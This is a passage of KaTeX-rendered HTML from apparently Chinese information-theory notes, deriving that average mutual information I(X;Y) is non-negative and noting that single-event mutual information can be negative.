style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9721em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:3.0652em;vertical-align:-1.4138em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4138em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.936em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></span></span></p><p>注意：</p><ol><li><p><strong>互信息量是可以为正，也可以为负</strong>。</p></li><li><p>但是<strong>平均互信息量是非负数</strong>。相互独立的时候有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo stretchy="false">(</mo><mi>a</mi><mi>b</mi><mo stretchy="false">)</mo><mo>=</mo><mi>p</mi><mo stretchy="false">(</mo><mi>a</mi><mo stretchy="false">)</mo><mi>p</mi><mo stretchy="false">(</mo><mi>b</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p(ab)=p(a)p(b)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">ab</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mclose">)</span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">b</span><span class="mclose">)</span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mi>I</mi><mrow><mo fence="true">(</mo><mi>X</mi><mo separator="true">;</mo><mi>Y</mi><mo fence="true">)</mo></mrow><mo>=</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mrow><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow><mi>log</mi><mo>⁡</mo><mfrac><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow></mrow><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow></mrow></mfrac></mrow></mrow><mo>=</mo><mfrac><mn>1</mn><mrow><mi>ln</mi><mo>⁡</mo><mn>2</mn></mrow></mfrac><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mrow><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow><mi>ln</mi><mo>⁡</mo><mfrac><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow></mrow><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow></mrow></mfrac></mrow></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mo>−</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mrow><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow><mi>ln</mi><mo>⁡</mo><mfrac><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow></mrow><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow></mrow></mfrac></mrow></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>≥</mo><mo>−</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mrow><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow><mrow><mo fence="true">(</mo><mfrac><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow></mrow><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow></mrow></mfrac><mo>−</mo><mn>1</mn><mo fence="true">)</mo></mrow></mrow></mrow><mo>=</mo><mo>−</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mrow><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><mrow><mo fence="true">(</mo><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow><mo>−</mo><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow><mo fence="true">)</mo></mrow></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mo>−</mo><mrow><mo fence="true">(</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow></mrow><mo>−</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow></mrow><mo fence="true">)</mo></mrow><mo>=</mo><mn>0</mn></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{align*}  &amp;I\left( X;Y \right) =\sum_{i=1}^n{\sum_{j=1}^m{p\left( a_ib_j \right) \log \frac{p\left( a_ib_j \right)}{p\left( a_i \right) p\left( b_j \right)}}}=\frac{1}{\ln 2}\sum_{i=1}^n{\sum_{j=1}^m{p\left( a_ib_j \right) \ln \frac{p\left( a_ib_j \right)}{p\left( a_i \right) p\left( b_j \right)}}}\\  &amp;=-\sum_{i=1}^n{\sum_{j=1}^m{p\left( a_ib_j \right) \ln \frac{p\left( a_i \right) p\left( b_j \right)}{p\left( a_ib_j \right)}}}\\  &amp;\ge -\sum_{i=1}^n{\sum_{j=1}^m{p\left( a_ib_j \right) \left( \frac{p\left( a_i \right) p\left( b_j \right)}{p\left( a_ib_j \right)}-1 \right)}}=-\sum_{i=1}^n{\sum_{j=1}^m{\left( p\left( a_i \right) p\left( b_j \right) -p\left( a_ib_j \right) \right)}}\\  &amp;=-\left( \sum_{i=1}^n{p\left( a_i \right)}-\sum_{i=1}^n{p\left( a_i \right)} \right) =0\end{align*}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:13.4232em;vertical-align:-6.4616em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:6.9616em;"><span style="top:-9.0602em;"><span class="pstrut" style="height:3.75em;"></span><span class="mord"></span></span><span style="top:-5.695em;"><span class="pstrut" style="height:3.75em;"></span><span class="mord"></span></span><span style="top:-2.3299em;"><span class="pstrut" style="height:3.75em;"></span><span class="mord"></span></span><span style="top:1.1339em;"><span class="pstrut" style="height:3.75em;"></span><span class="mord"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:6.4616em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:6.9616em;"><span style="top:-9.0602em;"><span class="pstrut" style="height:3.75em;"></span><span class="mord"><span class="mord"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4138em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9721em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mop">ln</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4138em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" 